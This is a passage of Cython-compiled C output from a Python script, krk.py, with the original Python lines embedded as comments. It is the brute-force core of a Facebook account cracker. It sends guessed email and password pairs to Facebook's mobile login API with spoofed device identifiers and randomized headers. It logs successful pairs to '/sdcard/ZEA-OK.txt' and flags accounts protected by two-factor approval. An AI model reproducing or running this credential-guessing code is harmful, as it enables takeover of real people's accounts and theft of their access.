          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 421, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_li2, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":422
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
        __pyx_t_4 = __pyx_pf_3krk_3api_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 422, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 422, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_j1, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "krk.py":423
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 *                         jazoest = li2+j1             # <<<<<<<<<<<<<<
 *                         data = {
 *                                 'adid':adid,
 */
        __pyx_t_5 = PyNumber_Add(__pyx_v_li2, __pyx_v_j1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 423, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_jazoest, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":425
 *                         jazoest = li2+j1
 *                         data = {
 *                                 'adid':adid,             # <<<<<<<<<<<<<<
 *                                 'format':'json',
 *                                 'device_id':device_id,
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(22); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 425, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_adid, __pyx_v_adid) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_format, __pyx_n_s_json) < 0) __PYX_ERR(0, 425, __pyx_L3_error)

        /* "krk.py":427
 *                                 'adid':adid,
 *                                 'format':'json',
 *                                 'device_id':device_id,             # <<<<<<<<<<<<<<
 *                                 'email':ids,
 *                                 'password':pas,
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 425, __pyx_L3_error)

        /* "krk.py":428
 *                                 'format':'json',
 *                                 'device_id':device_id,
 *                                 'email':ids,             # <<<<<<<<<<<<<<
 *                                 'password':pas,
 *                                 'generate_analytics_claims':'1',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_email, __pyx_v_ids) < 0) __PYX_ERR(0, 425, __pyx_L3_error)

        /* "krk.py":429
 *                                 'device_id':device_id,
 *                                 'email':ids,
 *                                 'password':pas,             # <<<<<<<<<<<<<<
 *                                 'generate_analytics_claims':'1',
 *                                 'community_id':'',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_password, __pyx_v_pas) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_analytics_claims, __pyx_kp_s_1) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_community_id, __pyx_kp_s__52) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_cpl, __pyx_n_s_true) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_try_num, __pyx_kp_s_1) < 0) __PYX_ERR(0, 425, __pyx_L3_error)

        /* "krk.py":434
 *                                 'cpl':'true',
 *                                 'try_num':'1',
 *                                 'family_device_id':family,             # <<<<<<<<<<<<<<
 *                                 'sim_serials':sim_serials,
 *                                 'credentials_type':'password',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_family_device_id, __pyx_v_family) < 0) __PYX_ERR(0, 425, __pyx_L3_error)

        /* "krk.py":435
 *                                 'try_num':'1',
 *                                 'family_device_id':family,
 *                                 'sim_serials':sim_serials,             # <<<<<<<<<<<<<<
 *                                 'credentials_type':'password',
 *                                 'source':'login',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_sim_serials, __pyx_v_sim_serials) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_credentials_type, __pyx_n_s_password) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_source, __pyx_n_s_login) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_error_detail_type, __pyx_n_s_button_with_disabled) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_enroll_misauth, __pyx_n_s_false) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_session_cookies, __pyx_kp_s_1) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_machine_id, __pyx_kp_s_1) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_meta_inf_fbmeta, __pyx_kp_s__52) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_currently_logged_in_userid, __pyx_kp_s_0) < 0) __PYX_ERR(0, 425, __pyx_L3_error)

        /* "krk.py":444
 *                                 'meta_inf_fbmeta':'',
 *                                 'currently_logged_in_userid':'0',
 *                                 'locale':fblc,             # <<<<<<<<<<<<<<
 *                                 'client_country_code':'',
 *                                 'fb_api_req_friendly_name':'authenticate',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_locale, __pyx_v_fblc) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_client_country_code, __pyx_kp_s__52) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_fb_api_req_friendly_name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 425, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "krk.py":449
 *                         }
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',             # <<<<<<<<<<<<<<
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_accessToken, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_17 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OAuth, __pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_Authorization, __pyx_t_17) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Friendly_Name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 449, __pyx_L3_error)

        /* "krk.py":451
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 451, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 451, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__78, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 451, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 451, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Connection_Bandwidth, __pyx_t_4) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "krk.py":452
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-Connection-Type':'unknown',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 452, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 452, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_tuple__79, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 452, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 452, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Net_HNI, __pyx_t_17) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

        /* "krk.py":453
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-Connection-Type':'unknown',
 *                                 'User-Agent':ua,
 */
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 453, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 453, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__79, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 453, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 453, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_SIM_HNI, __pyx_t_4) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Connection_Type, __pyx_n_s_unknown) < 0) __PYX_ERR(0, 449, __pyx_L3_error)

        /* "krk.py":455
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-Connection-Type':'unknown',
 *                                 'User-Agent':ua,             # <<<<<<<<<<<<<<
 *                                 'Accept-Encoding':'gzip, deflate',
 *                                 'Content-Type': 'application/x-www-form-urlencoded',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_User_Agent, __pyx_v_ua) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Accept_Encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Content_Type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_HTTP_Engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 449, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "krk.py":460
 *                                 'X-FB-HTTP-Engine': 'Liger'
 *                                 }
 *                         url = 'https://b-graph.facebook.com/auth/login'             # <<<<<<<<<<<<<<
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 */
        __Pyx_INCREF(__pyx_kp_s_https_b_graph_facebook_com_auth);
        __Pyx_XDECREF_SET(__pyx_v_url, __pyx_kp_s_https_b_graph_facebook_com_auth);

        /* "krk.py":461
 *                                 }
 *                         url = 'https://b-graph.facebook.com/auth/login'
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'             # <<<<<<<<<<<<<<
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 */
        __pyx_t_5 = __Pyx_PyStr_Concat(__pyx_kp_s_Login_approval, __pyx_kp_s_s_are_on); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 461, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyStr_ConcatInPlace(__pyx_t_5, __pyx_kp_s_Expect_an_SMS); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 461, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyStr_ConcatInPlace(__pyx_t_4, __pyx_kp_s_shortly_with); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 461, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyStr_ConcatInPlace(__pyx_t_5, __pyx_kp_s_a_code_to_use); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 461, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyStr_ConcatInPlace(__pyx_t_4, __pyx_kp_s_for_log_in); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 461, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_twf, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":462
 *                         url = 'https://b-graph.facebook.com/auth/login'
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()             # <<<<<<<<<<<<<<
 *                         if 'session_key' in po:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 462, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 462, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 462, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
        __pyx_t_9 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 462, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 462, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 462, __pyx_L3_error)
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_t_4, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 462, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_json); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 462, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 462, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_po, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":463
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 */
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_v_po, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 463, __pyx_L3_error)
        if (__pyx_t_23) {

          /* "krk.py":464
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 *                                         oks.append(ids)
 */
          __pyx_t_5 = PyNumber_Add(__pyx_kp_s_1_32m_ZEA_OK, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 464, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_9 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__68); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 464, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_9, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 464, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_9 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 464, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 464, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "krk.py":465
 *                         if 'session_key' in po:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         oks.append(ids)
 *                                         break
 */
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 465, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 465, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_9 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 465, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_4 = PyNumber_Add(__pyx_t_9, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 465, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_9 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__63); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 465, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = NULL;
          __pyx_t_10 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_10 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_9};
            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 465, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "krk.py":466
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 *                                         oks.append(ids)             # <<<<<<<<<<<<<<
 *                                         break
 *                         elif twf in str(po):
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_oks); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 466, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_5, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 466, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "krk.py":467
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 *                                         oks.append(ids)
 *                                         break             # <<<<<<<<<<<<<<
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:
 */
          goto __pyx_L18_break;

          /* "krk.py":463
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 */
        }

        /* "krk.py":468
 *                                         oks.append(ids)
 *                                         break
 *                         elif twf in str(po):             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)
 */
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_v_po); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 468, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_v_twf, __pyx_t_5, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 468, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (__pyx_t_23) {

          /* "krk.py":469
 *                                         break
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_pcp); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 469, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_5, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 469, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_23) {

            /* "krk.py":470
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;34m[ZEA-2F] '+ids+' | '+pas)             # <<<<<<<<<<<<<<
 *                                                 twf.append(ids)
 *                                                 break
 */
            __pyx_t_5 = PyNumber_Add(__pyx_kp_s_1_34m_ZEA_2F, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 470, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__68); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 470, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
